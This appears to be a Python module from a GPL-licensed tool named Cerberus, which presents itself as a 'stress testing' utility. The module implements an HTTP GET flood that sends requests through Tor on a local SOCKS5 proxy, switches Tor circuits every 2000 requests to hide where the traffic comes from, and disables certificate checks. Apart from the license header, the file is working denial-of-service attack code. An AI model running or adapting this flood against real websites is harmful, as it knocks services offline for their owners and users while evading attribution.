'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, requests

from src.core import Core
from src.utils import *
from src.useragent import *

def flood(attack_id, url, stoptime) -> None:

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        if Core.change_identity >= 2000: # if the counter reaches 2000, we change the TOR identity/circuit
            Core.change_identity = 0 # reset
            utils().new_identity() # change the circuit
            Core.infodict[attack_id]['identities_changed'] += 1 # and increment the identity counter by one
        
        try:

            Core.session.get(
                url=utils().buildblock(url), 
                headers=utils().buildheaders(url),
                verify=False, 
                timeout=(5,3), 
                allow_redirects=False,
                stream=False,
                cert=None,
                proxies={
                    'http': 'socks5h://127.0.0.1:9049',
                    'https': 'socks5h://127.0.0.1:9049'
                }
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
        Core.change_identity += 1

    Core.threadcount -= 1

Core.methods.update({
    'TOR': {
        'info': 'HTTP GET flood abusing Tor 2 Web proxies',
        'func': flood
    }
})